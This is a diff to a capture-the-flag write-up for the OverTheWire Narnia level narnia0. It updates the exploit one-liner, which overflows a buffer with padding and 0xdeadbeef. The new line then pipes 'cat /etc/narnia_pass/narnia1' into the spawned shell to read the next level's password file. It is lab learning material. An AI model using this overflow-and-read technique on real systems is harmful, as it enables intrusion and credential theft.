@@ -18,8 +18,7 @@ Also we need to take care to make sure out stdin remains open after the exploit 
 
 Keeping all that in mind, that exploit command I used:
 ```bash
-(python -c"print 'A'*20 + '\xef\xbe\xad\xde'"; cat -) | ./narnia0
+(python -c"print 'A'*20 + '\xef\xbe\xad\xde'"; echo "cat /etc/narnia_pass/narnia1") | ./narnia0
 ```
 
-This gave kept the stdin open for the shell to work, and using that opened shell, I `cat`-ed the password for narnia1
-
+~This gave kept the stdin open for the shell to work, and using that opened shell, I `cat`-ed the password for narnia1~ No need now. Exploit updated
